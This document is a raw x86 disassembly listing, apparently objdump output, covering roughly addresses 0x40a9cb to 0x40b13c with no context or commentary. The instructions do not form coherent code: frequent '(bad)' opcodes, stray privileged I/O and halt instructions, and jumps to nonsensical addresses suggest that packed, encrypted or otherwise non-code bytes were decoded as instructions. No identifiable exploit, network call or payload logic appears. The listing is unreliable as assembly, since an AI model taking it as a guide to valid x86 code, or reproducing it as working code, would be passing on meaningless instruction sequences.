  40a9cb:	mov    ds:0xdcea8fd1,eax
  40a9d0:	std    
  40a9d1:	mov    dh,0x3b
  40a9d3:	xchg   BYTE PTR [esi-0x7d8be5f7],dl
  40a9d9:	sub    eax,0x89d0e82
  40a9de:	lahf   
  40a9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e0:	pushf  
  40a9e1:	ds mov ch,0x18
  40a9e4:	sti    
  40a9e5:	mov    esi,0xbdd9f7a1
  40a9ea:	in     al,dx
  40a9eb:	retf   
  40a9ec:	hlt    
  40a9ed:	int    0x7
  40a9ef:	mov    ds:0xb100ffb6,al
  40a9f4:	fwait
  40a9f5:	inc    eax
  40a9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9f7:	adc    edx,DWORD PTR [edi+ebx*2-0x69]
  40a9fb:	jge    0x40a9f4
  40a9fd:	xor    al,0x91
  40a9ff:	rol    DWORD PTR [edi],0xd1
  40aa02:	inc    ecx
  40aa03:	add    ecx,DWORD PTR [eax-0x29c0bc66]
  40aa09:	mov    bh,0xa8
  40aa0b:	mov    esi,0x414b3865
  40aa10:	and    eax,0x4322a77c
  40aa15:	jb     0x40a9ce
  40aa17:	push   eax
  40aa18:	cmp    al,0x82
  40aa1a:	add    eax,0x93fb136e
  40aa1f:	mov    dl,0xd1
  40aa21:	add    edx,DWORD PTR [edx+0x1c]
  40aa24:	stos   BYTE PTR es:[edi],al
  40aa25:	je     0x40a9d8
  40aa27:	xchg   esi,eax
  40aa28:	lahf   
  40aa29:	jae    0x40aa79
  40aa2b:	bound  edi,QWORD PTR [ecx+0xf]
  40aa2e:	xor    edx,ebp
  40aa30:	rol    ecx,1
  40aa32:	aas    
  40aa33:	mulps  xmm5,XMMWORD PTR [ecx]
  40aa36:	and    eax,0x486f175f
  40aa3b:	test   esi,edi
  40aa3d:	(bad)  
  40aa3f:	(bad)  
  40aa40:	(bad)  
  40aa41:	adc    eax,0x573f000f
  40aa46:	test   BYTE PTR [ecx+0xd],ah
  40aa49:	xchg   ebx,eax
  40aa4a:	popa   
  40aa4b:	ds int 0x4b
  40aa4e:	nop
  40aa4f:	mov    eax,ds:0x2f6ede60
  40aa54:	out    0xf7,eax
  40aa56:	ss add dl,dl
  40aa59:	mov    edi,0x4e9e87ae
  40aa5e:	js     0x40aab9
  40aa60:	push   eax
  40aa61:	fadd   st,st(5)
  40aa63:	pop    es
  40aa64:	inc    ebx
  40aa65:	inc    ebx
  40aa66:	push   ss
  40aa67:	lea    esp,[esp+edi*8-0x39]
  40aa6b:	stos   BYTE PTR es:[edi],al
  40aa6c:	cmp    eax,0x66e4b096
  40aa71:	push   eax
  40aa72:	cld    
  40aa73:	or     al,0xcf
  40aa75:	call   FWORD PTR [ecx+ecx*4]
  40aa78:	ror    BYTE PTR [ecx+0x596f6a7c],1
  40aa7e:	fdiv   DWORD PTR [edi-0xc]
  40aa81:	dec    BYTE PTR [edx-0x2ac41dcc]
  40aa87:	lock mov BYTE PTR [eax-0x16],ah
  40aa8b:	sbb    bl,BYTE PTR [eax-0x586142b0]
  40aa91:	sbb    ah,BYTE PTR [eax-0x301bac8f]
  40aa97:	dec    edx
  40aa98:	mov    dh,0xf4
  40aa9a:	mov    esi,0x9adcf9a1
  40aa9f:	mov    cl,0xad
  40aaa1:	cli    
  40aaa2:	sahf   
  40aaa3:	xlat   BYTE PTR ds:[ebx]
  40aaa4:	or     esp,DWORD PTR [esi+0x19]
  40aaa7:	jae    0x40aa49
  40aaa9:	push   ebp
  40aaaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaab:	pop    esi
  40aaac:	es inc esi
  40aaae:	push   ecx
  40aaaf:	jne    0x40aa52
  40aab1:	xchg   DWORD PTR [ebx+0x57000c6a],esi
  40aab7:	xor    al,0xa1
  40aab9:	cmp    eax,0x9213554
  40aabe:	adc    BYTE PTR [ebx+0x7a],bh
  40aac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aac2:	aaa    
  40aac3:	cmp    ah,bh
  40aac5:	jbe    0x40aa4b
  40aac7:	mov    bl,0x43
  40aac9:	push   ds
  40aaca:	scas   eax,DWORD PTR es:[edi]
  40aacb:	mov    dh,0xcf
  40aacd:	outs   dx,DWORD PTR ds:[esi]
  40aace:	push   eax
  40aacf:	inc    ebp
  40aad0:	push   eax
  40aad1:	lock loopne 0x40aab3
  40aad4:	dec    edi
  40aad5:	xchg   ecx,eax
  40aad6:	bound  edx,QWORD PTR [ebx-0x79]
  40aad9:	sub    BYTE PTR [edx],0x5e
  40aadc:	fidiv  DWORD PTR [eax-0xd]
  40aadf:	push   ds
  40aae0:	jns    0x40ab01
  40aae2:	cmp    cl,BYTE PTR [edi+0x2efb6fa5]
  40aae8:	dec    eax
  40aae9:	mov    dl,0x62
  40aaeb:	sbb    BYTE PTR [edx+eax*1-0x6dc8f1d3],0x9d
  40aaf3:	add    BYTE PTR [eax-0x3c57cba2],0xe5
  40aafa:	push   esi
  40aafb:	add    BYTE PTR [esp+ebp*4-0x4dc45529],0xe7
  40ab03:	pushf  
  40ab04:	scas   eax,DWORD PTR es:[edi]
  40ab05:	(bad)  
  40ab07:	xchg   ecx,eax
  40ab08:	jb     0x40aad3
  40ab0a:	ins    BYTE PTR es:[edi],dx
  40ab0b:	or     al,0x6d
  40ab0d:	pop    ds
  40ab0e:	push   ebx
  40ab0f:	push   ss
  40ab10:	ret    0xb462
  40ab13:	(bad)  
  40ab14:	idiv   DWORD PTR [ebx]
  40ab16:	jo     0x40ab83
  40ab18:	popa   
  40ab19:	gs pop ds
  40ab1b:	mov    al,ds:0x8ad9c676
  40ab20:	dec    esp
  40ab21:	sub    eax,0x657928ac
  40ab26:	xchg   ebp,eax
  40ab27:	inc    ebp
  40ab28:	lods   eax,DWORD PTR ds:[esi]
  40ab29:	mov    eax,ds:0xc98c25e8
  40ab2e:	nop
  40ab2f:	jecxz  0x40aafc
  40ab31:	cs and al,0x5b
  40ab34:	mov    al,0x18
  40ab36:	enter  0xa91f,0x65
  40ab3a:	mov    esi,0xa749e9cd
  40ab3f:	and    eax,0xb30028b
  40ab44:	ret    0x3b70
  40ab47:	mov    dh,0x65
  40ab49:	mov    ebx,0x4b7aec85
  40ab4e:	fwait
  40ab4f:	push   ss
  40ab50:	(bad)  
  40ab51:	jg     0x40abc6
  40ab53:	mov    ebx,0xc3764c43
  40ab58:	inc    esp
  40ab59:	push   0x66
  40ab5b:	iret   
  40ab5c:	call   0x64fd8fba
  40ab61:	ds adc al,0xfe
  40ab64:	(bad)  
  40ab65:	mul    DWORD PTR [esi-0x3c]
  40ab68:	sub    BYTE PTR [ebx+0x529bd25c],ah
  40ab6e:	and    al,0xde
  40ab70:	fbld   TBYTE PTR [esi-0x72]
  40ab73:	hlt    
  40ab74:	imul   ecx,DWORD PTR [esi],0x913040a4
  40ab7a:	and    eax,0xab3b6704
  40ab7f:	xor    DWORD PTR [ecx+0x27d4f931],edx
  40ab85:	imul   BYTE PTR [edx-0x7b631ee1]
  40ab8b:	lock push ss
  40ab8d:	(bad)  
  40ab8e:	pop    eax
  40ab8f:	adc    dl,BYTE PTR [edi+0x18]
  40ab92:	sub    DWORD PTR [edx-0x4d5f3617],0xde460008
  40ab9c:	xchg   esp,eax
  40ab9d:	out    dx,al
  40ab9e:	adc    DWORD PTR ds:[edi],esp
  40aba1:	xlat   BYTE PTR ds:[ebx]
  40aba2:	nop
  40aba3:	xchg   esp,eax
  40aba4:	in     al,dx
  40aba5:	or     al,0x23
  40aba7:	int3   
  40aba8:	add    ebx,DWORD PTR cs:[esi+0x63]
  40abac:	pusha  
  40abad:	enter  0x22c5,0xec
  40abb1:	jns    0x40aba4
  40abb3:	add    BYTE PTR [eax],cl
  40abb5:	call   DWORD PTR [eax]
  40abb7:	pop    ss
  40abb8:	xor    al,0xd4
  40abba:	test   edx,esi
  40abbc:	and    BYTE PTR [edx+ebp*8],bh
  40abbf:	into   
  40abc0:	mov    edx,0xa545876c
  40abc5:	stos   DWORD PTR es:[edi],eax
  40abc6:	ficom  DWORD PTR [ecx+edx*4+0xcec5eff]
  40abcd:	dec    ebx
  40abce:	xchg   esi,eax
  40abcf:	(bad)  
  40abd1:	push   esp
  40abd3:	cmp    al,BYTE PTR [edx]
  40abd5:	call   0x91c7dfca
  40abda:	fimul  DWORD PTR [esi+0x7e]
  40abdd:	shl    BYTE PTR [ecx+ecx*4-0x58],cl
  40abe1:	adc    esp,ecx
  40abe3:	enter  0x315c,0xce
  40abe7:	dec    ebx
  40abe8:	jmp    0xef0d5a6a
  40abed:	jbe    0x40aba8
  40abef:	cwde   
  40abf0:	pop    eax
  40abf1:	add    ebx,DWORD PTR [edx-0x3588f737]
  40abf7:	cmp    edi,esp
  40abf9:	das    
  40abfa:	(bad)
  40abfd:	mov    eax,ds:0x180400a4
  40ac02:	test   eax,0xdf698aba
  40ac07:	popf   
  40ac08:	retf   0x519b
  40ac0b:	jecxz  0x40ac68
  40ac0d:	outs   dx,BYTE PTR ds:[esi]
  40ac0e:	adc    BYTE PTR [edi-0x57],al
  40ac11:	(bad)  
  40ac12:	repnz nop
  40ac14:	xchg   esp,eax
  40ac15:	mov    esp,0x42f5ace9
  40ac1a:	(bad)  
  40ac1b:	sub    DWORD PTR [edi-0xe99652a],ebx
  40ac21:	aad    0x41
  40ac23:	ds adc edx,ecx
  40ac26:	outs   dx,BYTE PTR ds:[esi]
  40ac27:	mov    ebx,0x69b9cca
  40ac2c:	sub    DWORD PTR [esi+ecx*2-0xed3b286],ecx
  40ac33:	ins    DWORD PTR es:[edi],dx
  40ac34:	mov    esi,0x2cd2da41
  40ac39:	adc    eax,0xdc693697
  40ac3e:	sar    DWORD PTR [ebp+0x16],cl
  40ac41:	add    al,BYTE PTR [edx-0xb]
  40ac44:	int    0xac
  40ac46:	mov    edi,0xd394efdc
  40ac4b:	das    
  40ac4c:	sbb    BYTE PTR [edx+esi*8],cl
  40ac4f:	sbb    BYTE PTR [edx-0x47],0xa
  40ac53:	popa   
  40ac54:	sub    al,0x6d
  40ac56:	(bad)  
  40ac57:	sub    al,0xf7
  40ac59:	aas    
  40ac5a:	mov    ebp,0x6b648372
  40ac5f:	add    eax,0xb9fa1196
  40ac64:	inc    ebx
  40ac65:	xchg   edx,eax
  40ac66:	fistp  QWORD PTR [esi-0x6e]
  40ac69:	pop    ds
  40ac6a:	in     al,0xe2
  40ac6c:	fldcw  WORD PTR [ebx-0x55c759b3]
  40ac72:	cmp    al,0x10
  40ac74:	std    
  40ac75:	fisttp WORD PTR [eax+0x6e70cfd7]
  40ac7b:	mov    dh,0x6e
  40ac7d:	loopne 0x40ace5
  40ac7f:	xor    dh,ah
  40ac81:	js     0x40ac18
  40ac83:	out    dx,al
  40ac84:	ja     0x40ac26
  40ac86:	push   edx
  40ac87:	and    al,BYTE PTR [edi]
  40ac89:	cwde   
  40ac8a:	xchg   BYTE PTR [ebp+0x582a21dc],dh
  40ac90:	inc    eax
  40ac91:	and    cl,BYTE PTR [edi]
  40ac93:	in     al,dx
  40ac94:	stos   BYTE PTR es:[edi],al
  40ac95:	popa   
  40ac96:	jo     0x40aca2
  40ac98:	push   0xffffffbe
  40ac9a:	and    dl,BYTE PTR [esi-0x17]
  40ac9d:	mov    gs,WORD PTR [edx+eax*2+0x36]
  40aca1:	pop    ebp
  40aca2:	out    dx,eax
  40aca3:	fdivr  st,st(5)
  40aca5:	ror    BYTE PTR [eax+0x2fcf097b],cl
  40acab:	mov    eax,0x719aba68
  40acb0:	mov    esi,0x59a19a50
  40acb5:	loopne 0x40ace9
  40acb7:	mov    eax,DWORD PTR [edi-0x18b1e918]
  40acbd:	(bad)  
  40acbe:	scas   al,BYTE PTR es:[edi]
  40acbf:	jns    0x40ad12
  40acc1:	std    
  40acc2:	daa    
  40acc3:	fistp  QWORD PTR [ebp+0x44]
  40acc6:	push   0x32
  40acc8:	xchg   ebx,eax
  40acc9:	popf   
  40acca:	ins    DWORD PTR es:[edi],dx
  40accb:	in     eax,0xd8
  40accd:	out    dx,eax
  40acce:	hlt    
  40accf:	in     al,dx
  40acd0:	pop    edi
  40acd1:	mov    bl,0x75
  40acd3:	add    BYTE PTR [ebp+0x2787cfbe],dh
  40acd9:	push   eax
  40acda:	xchg   edi,eax
  40acdb:	mov    al,ds:0xeb6c90c7
  40ace0:	xchg   dl,bl
  40ace2:	into   
  40ace3:	jmp    FWORD PTR [esi]
  40ace5:	aam    0x53
  40ace7:	(bad)  
  40ace8:	pop    ss
  40ace9:	sub    BYTE PTR [edx-0x794f2c59],bl
  40acef:	call   0xd455a28f
  40acf4:	sbb    al,0x6
  40acf6:	ret    
  40acf7:	push   eax
  40acf8:	add    al,0x76
  40acfa:	test   BYTE PTR [ebp+0x5bae4da9],dl
  40ad00:	cmp    bh,BYTE PTR [edx-0x72]
  40ad03:	jle    0x40ad1d
  40ad05:	lock and dl,ah
  40ad08:	inc    ecx
  40ad09:	and    DWORD PTR [ebx+0x3b],edi
  40ad0c:	jecxz  0x40ad0d
  40ad0e:	mov    dl,bl
  40ad10:	or     cl,BYTE PTR [edx]
  40ad12:	and    dh,BYTE PTR [ebx+edi*1+0x2b3d1019]
  40ad19:	jg     0x40ad79
  40ad1b:	stc    
  40ad1c:	dec    esp
  40ad1d:	cmp    al,0xae
  40ad1f:	rcl    BYTE PTR [edx-0x5b],1
  40ad22:	or     DWORD PTR [ebx+0x62df4c9b],ebx
  40ad28:	and    ecx,ebx
  40ad2a:	sbb    al,BYTE PTR [eax-0x31]
  40ad2d:	dec    edx
  40ad2e:	push   edi
  40ad2f:	push   esi
  40ad30:	fisttp DWORD PTR [ebp+0x5f]
  40ad33:	pushf  
  40ad34:	inc    esi
  40ad35:	mov    al,0x20
  40ad37:	test   DWORD PTR [edx],edi
  40ad39:	jmp    0x2470:0x2a109746
  40ad40:	xor    bl,BYTE PTR [edx-0x16148d04]
  40ad46:	inc    ebp
  40ad47:	arpl   WORD PTR [ebp-0x2e1ab1d6],di
  40ad4d:	cmp    al,0xf5
  40ad4f:	jle    0x40ad6f
  40ad51:	mov    eax,0xf9d340fa
  40ad56:	repnz bound ebx,QWORD PTR es:[edi-0x65]
  40ad5b:	mov    ss,ebx
  40ad5d:	sbb    ecx,DWORD PTR [edx]
  40ad5f:	iret   
  40ad60:	mov    ebx,0xec4fa07c
  40ad65:	and    eax,0x61131e78
  40ad6a:	fidiv  WORD PTR [ebx-0x43]
  40ad6d:	pop    esp
  40ad6e:	or     edx,DWORD PTR [ebx+0x671db732]
  40ad74:	rcl    dh,cl
  40ad76:	jecxz  0x40addf
  40ad78:	(bad)  
  40ad79:	fdivr  st(3),st
  40ad7b:	ret    
  40ad7c:	outs   dx,BYTE PTR ds:[esi]
  40ad7d:	jg     0x40adb3
  40ad7f:	xchg   ecx,eax
  40ad80:	js     0x40ada2
  40ad82:	cld    
  40ad83:	cmc    
  40ad84:	(bad)  
  40ad85:	jne    0x40ad88
  40ad87:	das    
  40ad88:	jbe    0x40ad9a
  40ad8a:	mov    ds:0x5ab4ee64,al
  40ad8f:	mov    esp,0xf002267d
  40ad94:	ret    0x7dbd
  40ad97:	int3   
  40ad98:	out    0x9d,al
  40ad9a:	stc    
  40ad9b:	mov    eax,DWORD PTR [ecx+0x5208cdc]
  40ada1:	fs je  0x40ad48
  40ada4:	jmp    0x40ad2b
  40ada6:	(bad)  
  40ada8:	push   0x45bcee96
  40adad:	lea    ebp,[edx+eiz*4+0x20a7d060]
  40adb4:	pop    ebx
  40adb5:	ins    DWORD PTR es:[edi],dx
  40adb6:	sbb    BYTE PTR [edi-0x7e10aeb8],dl
  40adbc:	cmp    ebp,DWORD PTR [ebp-0x4e]
  40adbf:	repz sti 
  40adc1:	dec    edx
  40adc2:	(bad)  
  40adc4:	jp     0x40ad62
  40adc6:	or     eax,0x7275cb85
  40adcb:	cmp    ebx,ebp
  40adcd:	adc    eax,0x14ea234e
  40add2:	lods   al,BYTE PTR ds:[esi]
  40add3:	push   ecx
  40add4:	in     al,0x87
  40add6:	aam    0xc4
  40add8:	mov    WORD PTR [esi+0x0],fs
  40addb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40addc:	lock cmp eax,0xb1192d3e
  40ade2:	addr16 push es
  40ade4:	fs ja  0x40ae5a
  40ade7:	cmp    eax,0x30daef11
  40adec:	test   esi,edx
  40adee:	sub    bl,BYTE PTR [edi+0x2d0e9369]
  40adf4:	or     eax,0x5fa5e32a
  40adf9:	popa   
  40adfa:	bound  ebx,QWORD PTR [edx+0x70]
  40adfd:	jle    0x40adb5
  40adff:	out    0x4f,eax
  40ae01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae02:	cmp    BYTE PTR [eax],dh
  40ae04:	xchg   esi,eax
  40ae05:	das    
  40ae06:	nop
  40ae07:	adc    eax,0xfe116369
  40ae0c:	(bad)  
  40ae0d:	push   0xffffffb2
  40ae0f:	call   0x193433a7
  40ae14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae15:	stos   DWORD PTR es:[edi],eax
  40ae16:	jmp    0x40ae97
  40ae18:	mov    edx,0xc17dc46c
  40ae1d:	iret   
  40ae1e:	adc    DWORD PTR gs:[edi-0x74c7735c],0x42365614
  40ae29:	adc    al,0xf9
  40ae2b:	xor    DWORD PTR [esi+ecx*1+0x55],ebx
  40ae2f:	loope  0x40ae34
  40ae31:	push   edx
  40ae32:	popf   
  40ae33:	fs loopne 0x40ae6a
  40ae36:	setge  BYTE PTR [edx]
  40ae39:	and    ebp,ebx
  40ae3b:	pop    edx
  40ae3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae3d:	mov    ds:0x452344c9,eax
  40ae42:	mov    ebx,0x7aaa36e4
  40ae47:	pop    esp
  40ae48:	jg     0x40addd
  40ae4a:	adc    DWORD PTR [edx-0x62],0x35
  40ae4e:	mov    WORD PTR [ecx+ebx*2],fs
  40ae51:	mov    WORD PTR [esi+ecx*1],ds
  40ae54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae55:	xchg   DWORD PTR ds:0xfa2b1018,ecx
  40ae5b:	xchg   edi,eax
  40ae5c:	xchg   esi,eax
  40ae5d:	and    bh,bh
  40ae5f:	into   
  40ae60:	inc    esp
  40ae61:	xor    al,0x94
  40ae63:	jnp    0x40ae34
  40ae65:	jecxz  0x40ae15
  40ae67:	fsub   st,st(5)
  40ae69:	adc    al,0x1f
  40ae6b:	stos   BYTE PTR es:[edi],al
  40ae6c:	dec    ecx
  40ae6d:	int    0xbd
  40ae6f:	pop    ds
  40ae70:	xchg   BYTE PTR [edx-0x11fe931],dh
  40ae76:	sub    DWORD PTR [eax-0x51],esp
  40ae79:	test   eax,0x98eda82f
  40ae7e:	in     eax,dx
  40ae7f:	mov    ah,0xe6
  40ae81:	xor    ah,ah
  40ae83:	enter  0x5f80,0x9b
  40ae87:	pop    ecx
  40ae88:	and    ch,ah
  40ae8a:	pop    edi
  40ae8b:	add    BYTE PTR [edi+0x6244de7d],0xea
  40ae92:	sub    DWORD PTR ds:0xe7bbdd23,ebx
  40ae98:	out    0xb3,eax
  40ae9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae9b:	push   cs
  40ae9c:	or     ebp,DWORD PTR ds:0x55b0c65f
  40aea2:	inc    ecx
  40aea3:	or     eax,0x7eba7896
  40aea8:	dec    ebx
  40aea9:	xor    al,0xb7
  40aeab:	cmp    esi,DWORD PTR [esi+0x59]
  40aeae:	rol    DWORD PTR [ecx-0x6],1
  40aeb1:	retf   0xce4
  40aeb4:	(bad)  
  40aeb5:	xor    eax,0xc408e4c
  40aeba:	mov    bh,0xb6
  40aebc:	aam    0xfa
  40aebe:	and    DWORD PTR es:[ebx+0x4a5e60e6],ecx
  40aec5:	js     0x40ae4c
  40aec7:	xor    dl,al
  40aec9:	jo     0x40aeef
  40aecb:	cmp    al,0xfb
  40aecd:	lock xchg edi,eax
  40aecf:	pop    es
  40aed0:	jo     0x40aefe
  40aed2:	jno    0x40aee2
  40aed4:	lea    esp,[bx+0x7a]
  40aed8:	in     al,dx
  40aed9:	xchg   esp,eax
  40aeda:	add    ebp,DWORD PTR [edx+0xc7a61a3]
  40aee0:	mov    edx,0x5f2a284b
  40aee5:	mov    dl,cl
  40aee7:	imul   esi,ebx,0x99302b22
  40aeed:	ret    
  40aeee:	iret   
  40aeef:	inc    ebp
  40aef0:	xor    ch,BYTE PTR [edi]
  40aef2:	xor    eax,0x2fd7be0d
  40aef7:	lock jno 0x40af63
  40aefa:	or     BYTE PTR [edi-0x2f704e65],ah
  40af00:	pop    edi
  40af01:	mov    eax,ds:0x5da887f1
  40af06:	arpl   ax,bp
  40af08:	out    dx,al
  40af09:	ss repz mov dl,0x92
  40af0d:	fcmovnbe st,st(7)
  40af0f:	lahf   
  40af10:	mov    eax,ds:0xba6b2d3
  40af15:	(bad)  
  40af16:	sbb    al,0x0
  40af18:	jbe    0x40aeb1
  40af1a:	test   al,0x58
  40af1c:	test   al,0xb4
  40af1e:	sti    
  40af1f:	mov    bl,0x42
  40af21:	pop    es
  40af22:	mov    ss,WORD PTR [ebx+0x5a]
  40af25:	cmp    ebx,DWORD PTR [edi]
  40af27:	in     eax,dx
  40af28:	adc    BYTE PTR [esi+edi*2-0x34],ch
  40af2c:	pushf  
  40af2d:	mov    ds:0x17ad19cf,al
  40af32:	nop
  40af33:	stc    
  40af34:	mov    WORD PTR [edi],?
  40af36:	das    
  40af37:	jp     0x40af6c
  40af39:	fisubr WORD PTR [eax]
  40af3b:	sbb    al,BYTE PTR [ecx-0x2c]
  40af3e:	jmp    DWORD PTR [esi]
  40af40:	cs ret 
  40af42:	imul   esp,DWORD PTR [ebp-0x469e2f62],0x98f8bd37
  40af4c:	pop    es
  40af4d:	in     eax,dx
  40af4e:	inc    esi
  40af4f:	push   eax
  40af50:	mov    edx,0xbe1c1131
  40af55:	cdq    
  40af56:	repz aaa 
  40af58:	test   eax,0x95ab3d5c
  40af5d:	ret    
  40af5e:	or     cl,BYTE PTR [edi]
  40af60:	dec    esi
  40af61:	pop    ebp
  40af62:	pop    ebx
  40af63:	adc    dl,ch
  40af65:	sub    dl,BYTE PTR [edi+ecx*2]
  40af68:	pop    edi
  40af69:	pop    ss
  40af6a:	or     eax,0xfc241ee6
  40af6f:	stc    
  40af70:	mov    ebp,esi
  40af72:	jg     0x40af70
  40af74:	bound  edi,QWORD PTR [ebx]
  40af76:	ins    DWORD PTR es:[edi],dx
  40af77:	mov    eax,ds:0x9aec8089
  40af7c:	in     al,0x46
  40af7e:	sbb    cl,BYTE PTR [ecx-0x5]
  40af81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af82:	or     cl,BYTE PTR [ebx]
  40af84:	cmp    ebp,DWORD PTR [ebp-0x7c]
  40af87:	popa   
  40af88:	jno    0x40af21
  40af8a:	pop    ecx
  40af8b:	mov    edx,0xd186033
  40af90:	xlat   BYTE PTR ds:[ebx]
  40af91:	sbb    BYTE PTR [ebp-0x5cc54f0d],0xc3
  40af98:	mov    BYTE PTR [eax+0x6269d28f],ah
  40af9e:	in     al,dx
  40af9f:	sbb    ah,bh
  40afa1:	mov    edi,0x196d72f3
  40afa6:	mov    ch,0x16
  40afa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa9:	cs add eax,0xcf9b8a84
  40afaf:	shl    DWORD PTR [eax],0x4b
  40afb2:	fimul  DWORD PTR [ebp+0x6059d796]
  40afb8:	mov    al,0x63
  40afba:	rcr    BYTE PTR [edx+esi*1-0x3f8df976],cl
  40afc1:	in     al,dx
  40afc2:	push   ebx
  40afc3:	mov    dl,dl
  40afc5:	stos   DWORD PTR es:[edi],eax
  40afc6:	sahf   
  40afc7:	push   es
  40afc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc9:	in     eax,dx
  40afca:	xchg   edi,eax
  40afcb:	pop    ebp
  40afcc:	rcl    ecx,1
  40afce:	and    ebp,DWORD PTR [edx+0x7855fe9c]
  40afd4:	inc    edx
  40afd5:	dec    esi
  40afd6:	pop    ebx
  40afd7:	dec    ecx
  40afd8:	add    dh,BYTE PTR [ecx+0x2227615d]
  40afde:	sub    eax,0x7819049b
  40afe3:	push   ds
  40afe4:	adc    ah,0xb1
  40afe7:	push   ds
  40afe8:	and    BYTE PTR [edi],0xb3
  40afeb:	jg     0x40afbf
  40afed:	pop    ebp
  40afee:	cmp    al,0xfc
  40aff0:	fadd   st,st(5)
  40aff2:	xchg   ebx,eax
  40aff3:	pop    es
  40aff4:	scas   al,BYTE PTR es:[edi]
  40aff5:	daa    
  40aff6:	addr16 loope 0x40b02d
  40aff9:	add    ebp,DWORD PTR [edi]
  40affb:	sub    al,0xd3
  40affd:	je     0x40af85
  40afff:	mov    eax,0x4be3ccbd
  40b004:	lds    esp,FWORD PTR [esi]
  40b006:	mov    edi,0xf4f07404
  40b00b:	mov    WORD PTR [ebx+esi*2-0x1e44800d],cs
  40b012:	and    al,0x92
  40b014:	outs   dx,BYTE PTR ds:[esi]
  40b015:	pop    es
  40b016:	or     al,0xc6
  40b018:	mov    ch,0xd5
  40b01a:	in     al,0x8d
  40b01c:	shl    BYTE PTR [ebx-0x17],1
  40b01f:	or     edx,DWORD PTR [ecx-0x20a0a0c3]
  40b025:	jl     0x40b0a2
  40b027:	stc    
  40b028:	sahf   
  40b029:	f2xm1  
  40b02b:	adc    al,0xef
  40b02d:	add    DWORD PTR [esi],0xffffffd5
  40b030:	xchg   esi,eax
  40b031:	(bad)  
  40b032:	fld    TBYTE PTR [edx-0x43]
  40b035:	xor    DWORD PTR [edi-0x40],ebx
  40b038:	out    dx,al
  40b039:	mov    edi,0x86064fc4
  40b03e:	bound  ecx,QWORD PTR [edx+eax*8-0x166d3a55]
  40b045:	pusha  
  40b046:	(bad)  
  40b047:	pop    esi
  40b048:	and    BYTE PTR [ebp+0x0],bl
  40b04b:	setl   cl
  40b04e:	mov    cl,0xd4
  40b050:	fsub   DWORD PTR [ecx+0x33d02ac2]
  40b056:	cs pop ecx
  40b058:	cmp    BYTE PTR [eax+0x75],ah
  40b05b:	pusha  
  40b05c:	xor    DWORD PTR ds:[esi+0x20],esp
  40b060:	inc    ecx
  40b061:	jmp    0x40b0d9
  40b063:	sub    DWORD PTR ds:0x1f206509,esp
  40b069:	(bad)  
  40b06a:	cli    
  40b06b:	jmp    0xedb3696e
  40b070:	dec    edi
  40b071:	or     al,0x19
  40b073:	cwde   
  40b074:	stos   BYTE PTR es:[edi],al
  40b075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b076:	add    BYTE PTR [ecx-0x9],al
  40b079:	and    esp,ebp
  40b07b:	push   ebp
  40b07c:	cs retf 0xc4b0
  40b080:	imul   edx,DWORD PTR [edx+0xc],0xffffffb8
  40b084:	mov    al,ds:0x5e9aedb5
  40b089:	dec    edx
  40b08a:	jp     0x40b092
  40b08c:	xor    BYTE PTR [esi-0x62],ch
  40b08f:	jge    0x40b045
  40b091:	push   cs
  40b092:	and    DWORD PTR [edi],ebx
  40b094:	js     0x40b032
  40b096:	mov    DWORD PTR [edx-0x64f87142],esp
  40b09c:	sbb    al,0x87
  40b09e:	cs pop eax
  40b0a0:	sbb    bh,dh
  40b0a2:	cmp    bl,ch
  40b0a4:	dec    ebp
  40b0a5:	mov    WORD PTR [eax+0x53],ds
  40b0a8:	mov    ebx,0x24a5a188
  40b0ad:	rcl    DWORD PTR [eax+0x3e],1
  40b0b0:	fild   QWORD PTR [ecx+esi*1-0x1e]
  40b0b4:	call   0xc27f58ba
  40b0b9:	push   es
  40b0ba:	xchg   ebp,eax
  40b0bb:	sbb    DWORD PTR [edx-0x5f57e02d],0x8620601
  40b0c5:	into   
  40b0c6:	and    BYTE PTR [ebx+0x289921f2],bl
  40b0cc:	mov    WORD PTR [edi+0x13e4c9b3],ds
  40b0d2:	push   edx
  40b0d3:	add    BYTE PTR [edi-0x7c9871c8],ah
  40b0d9:	inc    ebp
  40b0da:	push   0xfffffff6
  40b0dc:	ret    
  40b0dd:	ror    BYTE PTR [ebx+0x13f00851],cl
  40b0e3:	jp     0x40b093
  40b0e5:	lds    edx,FWORD PTR [esi+0x47b73f79]
  40b0eb:	imul   BYTE PTR [edi+eiz*1+0x1a]
  40b0ef:	or     ch,BYTE PTR [esi+0x9]
  40b0f2:	imul   ecx,DWORD PTR ds:0xe9bb4cf7,0xffffff9b
  40b0f9:	push   ecx
  40b0fa:	ins    BYTE PTR es:[edi],dx
  40b0fb:	pop    eax
  40b0fc:	sbb    DWORD PTR [edi-0x2e0efb7e],ecx
  40b102:	add    dh,BYTE PTR [ebx+0x5b2314b4]
  40b108:	cdq    
  40b109:	jmp    0x3bc0:0xe8482230
  40b110:	xchg   ebp,eax
  40b111:	push   0xffffff84
  40b113:	pop    ecx
  40b114:	adc    al,0x83
  40b116:	dec    ebp
  40b117:	dec    ebp
  40b118:	adc    DWORD PTR [ecx],edx
  40b11a:	in     al,dx
  40b11b:	dec    esi
  40b11c:	(bad)  
  40b11d:	enter  0x44f2,0x75
  40b121:	stc    
  40b122:	mov    ecx,edx
  40b124:	out    dx,al
  40b125:	mov    ds,WORD PTR [edi-0xe]
  40b128:	in     al,0x19
  40b12a:	xchg   esp,eax
  40b12b:	cmp    bh,BYTE PTR [ebp+0x43e4dc61]
  40b131:	stos   BYTE PTR es:[edi],al
  40b132:	inc    ecx
  40b133:	add    al,0x4c
  40b135:	mov    dl,0x8a
  40b137:	or     eax,0x6cc0fdf0
  40b13c:	sub    bh,BYTE PTR [ebx+0x18]
